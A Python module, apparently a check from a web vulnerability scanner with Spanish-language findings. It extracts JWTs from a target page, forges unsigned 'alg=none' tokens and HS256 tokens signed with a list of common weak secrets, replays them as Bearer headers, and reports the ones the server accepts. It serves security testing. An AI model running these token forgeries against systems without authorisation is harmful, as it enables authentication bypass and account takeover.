import base64
import hashlib
import hmac
import json
import re
from typing import Optional
from urllib.parse import urlparse

import requests

JWT_RE = re.compile(r"\beyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]*")

COMMON_SECRETS = [
    "secret", "changeme", "key", "jwt_secret", "your-256-bit-secret",
    "password", "123456", "admin", "supersecret", "privatekey", "test",
    "test123", "dev", "development", "my_secret_key",
]

BEARER_RE = re.compile(
    r'bearer\s+(eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]*)',
    re.IGNORECASE,
)
AUTH_RE = re.compile(
    r'["\']?(?:token|access_token|auth|jwt|api_key)["\']?\s*[:=]\s*["\'](eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]*)["\']',
    re.IGNORECASE,
)


def _decode_jwt(token: str) -> Optional[dict]:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header_b64 = parts[0]
        payload_b64 = parts[1]
        header_b64 += "=" * (4 - len(header_b64) % 4)
        payload_b64 += "=" * (4 - len(payload_b64) % 4)
        header = json.loads(base64.urlsafe_b64decode(header_b64).decode())
        payload = json.loads(base64.urlsafe_b64decode(payload_b64).decode())
        return {"header": header, "payload": payload}
    except Exception:
        return None


def _forge_none(token: str) -> Optional[str]:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        payload_b64 = parts[1]
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).decode().rstrip("=")
        return f"{header}.{payload_b64}."
    except Exception:
        return None


def _forge_hs256(token: str, secret: str) -> Optional[str]:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        payload_b64 = parts[1]
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
        ).decode().rstrip("=")
        sig = base64.urlsafe_b64encode(
            hmac.new(secret.encode(), f"{header}.{payload_b64}".encode(), hashlib.sha256).digest()
        ).decode().rstrip("=")
        return f"{header}.{payload_b64}.{sig}"
    except Exception:
        return None


def check_jwt_attacks(url: str, html_content: str = "", session: Optional[requests.Session] = None) -> list[dict[str, str]]:
    results: list[dict[str, str]] = []
    client = session if session is not None else requests

    urlparse(url)

    tokens = []
    try:
        r = client.get(url, timeout=8)
        html = r.text
        tokens.extend(JWT_RE.findall(html))
    except requests.RequestException:
        if html_content:
            html = html_content
            tokens.extend(JWT_RE.findall(html))
        else:
            return results

    if html_content:
        tokens.extend(JWT_RE.findall(html_content))
        combined = html_content
    else:
        combined = html

    script_tokens = re.findall(
        r'["\']([A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_.+/=]*)["\']',
        combined,
    )
    tokens.extend(script_tokens)
    tokens.extend(BEARER_RE.findall(combined))
    tokens.extend(AUTH_RE.findall(combined))

    tokens = list(set(t for t in tokens if len(t) > 20 and "." in t))
    if not tokens:
        return results

    results.append({
        "vuln": "JWT Expuesto en Cliente",
        "risk": "Bajo",
        "detail": f"Se detectaron {len(tokens)} token(s) JWT en el HTML/JS del cliente."
    })

    for token in tokens[:5]:
        decoded = _decode_jwt(token)
        if decoded is None:
            continue

        header = decoded["header"]
        payload = decoded["payload"]

        if header.get("alg", "").lower() == "none":
            results.append({
                "vuln": "JWT con Algoritmo 'none'",
                "risk": "Alto",
                "detail": f"JWT detectado con algoritmo 'none'. Esto permite bypassear la verificacion de firma. Payload: {json.dumps(payload)[:120]}"
            })
            break

        none_token = _forge_none(token)
        if none_token:
            auth_header_val = "Bearer " + none_token
            try:
                r = client.get(url, headers={"Authorization": auth_header_val}, timeout=5)
                if r.status_code == 200:
                    results.append({
                        "vuln": "JWT — Ataque 'alg=none' Aceptado",
                        "risk": "Alto",
                        "detail": f"El servidor acepto un JWT sin firma (alg=none). Payload original: {json.dumps(payload)[:120]}"
                    })
                    break
            except requests.RequestException:
                pass

    for token in tokens[:2]:
        decoded = _decode_jwt(token)
        if decoded is None:
            continue
        if decoded["header"].get("alg", "").upper() in ("HS256", "HS384", "HS512"):
            secret_found = False
            for secret in COMMON_SECRETS:
                forged = _forge_hs256(token, secret)
                if forged:
                    try:
                        r = client.get(url, headers={"Authorization": "Bearer " + forged}, timeout=5)
                        if r.status_code == 200:
                            results.append({
                                "vuln": "JWT — Secreto HMAC Debil",
                                "risk": "Alto",
                                "detail": f"JWT firmado con secreto HMAC predecible: '{secret}'. Se forjo una firma valida aceptada por el servidor."
                            })
                            secret_found = True
                            break
                    except requests.RequestException:
                        pass
            if secret_found:
                break

    return results
